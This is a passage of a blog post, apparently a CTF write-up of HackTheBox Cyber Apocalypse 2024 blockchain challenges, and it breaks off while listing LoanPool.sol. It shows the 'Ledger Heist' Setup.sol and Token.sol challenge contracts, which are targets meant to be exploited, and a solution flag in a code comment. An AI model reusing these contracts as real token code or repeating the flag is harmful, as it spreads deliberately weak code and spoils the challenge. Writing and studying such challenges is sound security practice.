<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Cyber Apocalypse 2024: Blockchain &amp; Hardware - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="Cyber Apocalypse 2024: Blockchain & Hardware">
  <meta name="twitter:description" content="Writeup for Blockchain &amp; Hardware challenges in Cyber Apocalypse 2024 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/cyber-apocalypse-2024-blockchain-hardware/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="Cyber Apocalypse 2024: Blockchain & Hardware">
  <meta property="og:description" content="Writeup for Blockchain &amp; Hardware challenges in Cyber Apocalypse 2024 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-03-14T20:00:00+07:00">
    <meta property="article:modified_time" content="2024-03-14T22:46:00+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cyber Apocalypse">
    <meta property="article:tag" content="Htb">
    <meta property="article:tag" content="Blockchain">
    <meta property="article:tag" content="Flash Loan">
    <meta property="article:tag" content="Hardware">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/cyber-apocalypse-2024-blockchain-hardware/" /><link rel="prev" href="https://chovid99.github.io/posts/cyber-apocalypse-2024-crypto/" /><link rel="next" href="https://chovid99.github.io/posts/kalmarctf-2024/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Cyber Apocalypse 2024: Blockchain \u0026 Hardware",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/cyber-apocalypse-2024-blockchain-hardware\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Cyber Apocalypse, htb, blockchain, flash loan, hardware, spiflash, eeprom, wallet","wordcount":  8012 ,
        "url": "https:\/\/chovid99.github.io\/posts\/cyber-apocalypse-2024-blockchain-hardware\/","datePublished": "2024-03-14T20:00:00+07:00","dateModified": "2024-03-14T22:46:00+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cyber Apocalypse 2024: Blockchain & Hardware</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Mar 14, 2024">Mar 14, 2024</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;8012 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;38 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#blockchain">Blockchain</a>
      <ul>
        <li><a href="#ledger-heist-hard">Ledger Heist [hard]</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a></li>
          </ul>
        </li>
        <li><a href="#recovery-easy">Recovery [easy]</a>
          <ul>
            <li><a href="#initial-analysis-1">Initial Analysis</a></li>
            <li><a href="#solution-1">Solution</a></li>
          </ul>
        </li>
        <li><a href="#lucky-faucet-easy">Lucky Faucet [easy]</a>
          <ul>
            <li><a href="#initial-analysis-2">Initial Analysis</a></li>
            <li><a href="#solution-2">Solution</a></li>
          </ul>
        </li>
        <li><a href="#russian-roulette-very-easy">Russian Roulette [very easy]</a>
          <ul>
            <li><a href="#initial-analysis-3">Initial Analysis</a></li>
            <li><a href="#solution-3">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#hardware">Hardware</a>
      <ul>
        <li><a href="#flash-ing-logs-hard">Flash-ing Logs [hard]</a>
          <ul>
            <li><a href="#initial-analysis-4">Initial Analysis</a></li>
            <li><a href="#solution-4">Solution</a></li>
          </ul>
        </li>
        <li><a href="#the-prom-medium">The PROM [medium]</a>
          <ul>
            <li><a href="#initial-analysis-5">Initial Analysis</a></li>
            <li><a href="#solution-5">Solution</a></li>
          </ul>
        </li>
        <li><a href="#rids-easy">Rids [easy]</a>
          <ul>
            <li><a href="#initial-analysis-6">Initial Analysis</a></li>
            <li><a href="#solution-6">Solution</a></li>
          </ul>
        </li>
        <li><a href="#bunnypass-very-easy">BunnyPass [very easy]</a>
          <ul>
            <li><a href="#solution-7">Solution</a></li>
          </ul>
        </li>
        <li><a href="#maze-very-easy">Maze [very easy]</a>
          <ul>
            <li><a href="#solution-8">Solution</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg" title="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg" data-thumbnail="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg" data-sub-html="<h2>HackTheBox - Cyber Apocalypse 2024: Hacker Royale</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg"
            data-srcset="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg, https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg 1.5x, https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg 2x"
            data-sizes="auto"
            alt="https://ctf.hackthebox.com/storage/ctf/banners/DREwio2TXADvSLScO07rux2olm6vjUoEXQPPAKBC.jpg" />
    </a><figcaption class="image-caption">HackTheBox - Cyber Apocalypse 2024: Hacker Royale</figcaption>
    </figure>
<p>I have been casually participating in the Cyber Apocalypse CTF 2024. During this time, I managed to solve all the challenges in the <strong>pwn, crypto, blockchain, and hardware</strong> categories. In this write-up, I will share my solutions for all the challenges in the <strong>blockchain &amp; hardware</strong> category that I solved. If you are interested in reading the write-up for all the <strong>pwn</strong> challenges, check out this <a href="http://chovid99.github.io/posts/cyber-apocalypse-2024-pwn/" target="_blank" rel="noopener noreffer ">post</a>. If you are interested in reading the write-up for all the <strong>crypto</strong> challenges, check out this <a href="http://chovid99.github.io/posts/cyber-apocalypse-2024-crypto/" target="_blank" rel="noopener noreffer ">post</a>.</p>
<figure><a class="lightgallery" href="https://i.imgur.com/3Hc0cYH.png" title="https://i.imgur.com/3Hc0cYH.png" data-thumbnail="https://i.imgur.com/3Hc0cYH.png" data-sub-html="<h2>I managed to solve all of the pwn, crypto, blockchain, and hardware challenges by myself :)</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/3Hc0cYH.png"
            data-srcset="https://i.imgur.com/3Hc0cYH.png, https://i.imgur.com/3Hc0cYH.png 1.5x, https://i.imgur.com/3Hc0cYH.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/3Hc0cYH.png" />
    </a><figcaption class="image-caption">I managed to solve all of the pwn, crypto, blockchain, and hardware challenges by myself :)</figcaption>
    </figure>
<h1 id="blockchain">Blockchain</h1>
<h2 id="ledger-heist-hard">Ledger Heist [hard]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Amidst the dystopian chaos, the LoanPool stands as a beacon for the oppressed, allowing the brave to deposit tokens in support of the cause. Your mission, should you choose to accept it, is to exploit the system&rsquo;s vulnerabilities and siphon tokens from this pool, a daring act of digital subterfuge aimed at weakening the regime&rsquo;s economic stronghold. Success means redistributing wealth back to the people, a crucial step towards undermining the oppressors&rsquo; grip on power.</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we received a zip file containing some smart contracts. As usual, let&rsquo;s begin by examining the <code>Setup.sol</code>.</p>
<p><strong>Setup.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LoanPool</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./LoanPool.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Token</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Token.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LoanPool</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TARGET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TOKEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_user</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">TOKEN</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Token</span><span class="p">(</span><span class="n">_user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LoanPool</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TOKEN</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">TOKEN</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span><span class="p">.</span><span class="n">deposit</span><span class="p">(</span><span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">TARGET</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">()</span> <span class="o">==</span> <span class="mi">10</span> <span class="kc">ether</span> <span class="o">&amp;&amp;</span> <span class="n">TOKEN</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">TARGET</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The challenge initially creates a new <code>Token</code>, a new <code>LoanPool</code>, and deposits <code>10 ether</code> into the <code>LoanPool</code> (<code>TARGET</code>). The objective is to maintain the total supply of the <code>LoanPool</code> at <code>10 ether</code>, while reducing the <code>TOKEN</code> balance of the <code>LoanPool</code> to less than <code>10 ether</code>. Let&rsquo;s first examine the <code>TOKEN</code>.</p>
<p><strong>Token.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Events</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Events.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// HTB{7H1nk_r0Und1ng_D1reC710N_7W1Ce}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">Token</span> <span class="k">is</span> <span class="n">Events</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">public</span> <span class="nb">name</span> <span class="o">=</span> <span class="s">&#34;Token&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">string</span> <span class="k">public</span> <span class="n">symbol</span> <span class="o">=</span> <span class="s">&#34;Tok&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">decimals</span> <span class="o">=</span> <span class="mi">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balanceOf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="k">public</span> <span class="n">allowance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_user</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">_user</span><span class="p">,</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">allowance</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">spender</span><span class="p">]</span> <span class="o">=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Approval</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">allowance</span><span class="p">[</span><span class="k">from</span><span class="p">][</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="n">to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">totalSupply</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_burn</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">balanceOf</span><span class="p">[</span><span class="k">from</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It implements a basic token mechanism, where upon construction, the caller is awarded <code>10 ether</code> and a specified <code>user</code> receives <code>1 ether</code>. For this challenge, it means <code>Setup.sol</code> receives <code>10 ether</code>, and the player (us) starts with a <code>1 ether</code> balance of <code>TOKEN</code>. Now, let&rsquo;s review the <code>LoanPool</code> contract.</p>
<p><strong>LoanPool.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
